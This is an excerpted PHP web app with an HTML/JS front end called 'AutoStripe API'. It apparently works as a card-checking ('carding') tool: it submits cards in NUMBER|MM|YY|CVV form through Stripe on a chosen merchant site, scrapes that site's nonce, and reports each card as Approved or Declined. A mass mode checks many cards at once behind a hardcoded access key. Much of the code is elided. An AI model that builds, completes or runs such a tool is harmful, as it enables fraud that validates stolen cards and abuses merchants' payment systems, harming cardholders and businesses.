<?php
/**
 * AutoStripe API - 100% Identical PHP Version
 * DEVELOPER: @diwazz
 */
...
// --- BACKEND LOGIC (Translated from Python) ---
...
function process_card($domain, $cc) {
    $parts = explode('|', $cc);
    if (count($parts) < 4) return ["Response" => "Invalid card format. Use: NUMBER|MM|YY|CVV", "Status" => "Declined"];
    ...
    if (!isset($res['id'])) return ["Response" => $res['error']['message'] ?? "Payment Method Creation Failed", "Status" => "Declined"];
    $pm_id = $res['id'];

    // 2. Get Nonce from site
    ...
    if (!$nonce) return ["Response" => "Failed to extract nonce from site", "Status" => "Declined"];
    ...
    if (isset($final['success']) && $final['success']) {
        ...
        $msg = $final['data']['error']['message'] ?? "All payment attempts failed";
...
if (isset($_GET['key']) && $_GET['key'] == 'inferno') {
    ...
    if (empty($site) || empty($cc)) {
        echo json_encode(["error" => "Missing parameters", "status" => "Bad Request"]);
    } else {
        echo json_encode(process_card($site, $cc));
    }
    exit;
}
    ...
    <style>
        ...
        * { margin: 0; padding: 0; box-sizing: border-box; }
        ...
        .loader {
            ...
            border-radius: 50%; width: 15px; height: 15px; animation: spin 1s linear infinite;
...
<body>
    ...
    <div class="container">
            ...
            <div class="glass-card">
                ...
                <div class="result-item">
                    ...
                    <div style="background: rgba(0,0,0,0.2); padding: 10px; border-radius: 5px; margin-top: 10px; font-family: monospace;">
                        index.php?key=inferno&site=example.com&cc=card_number|mm|yy|cvv
                    </div>
                </div>
            </div>
        </div>
        ...
        <footer>
            <p>&copy; 2026 AutoStripe API. All rights reserved. | DEVELOPER: @diwazz | Telegram Bio Channel</p>
        </footer>
    </div>
    ...
    <script>
        ...
        function checkSingleCard() {
            ...
            if(!site || !cc) return alert('Please fill in all fields');
            
            loader.style.display = 'inline-block';
            resContainer.classList.add('show');
            resContent.innerHTML = 'Processing...';
            ...
            fetch(`index.php?key=inferno&site=${site}&cc=${cc}`)
                ...
                .then(data => {
                    ...
                    resContent.innerHTML = `<div class="result-item ${data.Status === 'Approved' ? 'success' : 'error'}">
                        <div class="card-number">Card: ${cc.split('|')[0]}</div>
                ...
                .catch(e => {
                    loader.style.display = 'none';
                    resContent.innerHTML = `<div class="result-item error">Error: ${e.message}</div>`;
                });
        }
        ...
        function checkMassCards() {
            ...
            if(!site || cards.length === 0) return alert('Please fill in all fields');
            ...
            cards.forEach(card => {
                fetch(`index.php?key=inferno&site=${site}&cc=${card}`)
                    ...
                    .then(data => {
                        ...
                        resContent.innerHTML += `<div class="result-item ${data.Status === 'Approved' ? 'success' : 'error'}">
                            <div class="card-number">Card: ${card.split('|')[0]}</div>
                            <div class="card-response">Response: ${data.Response}</div>
                            <div class="card-status">Status: ${data.Status}</div>
                        </div>`;
                        
                        if(processed === cards.length) loader.style.display = 'none';
                    });
            });
        }
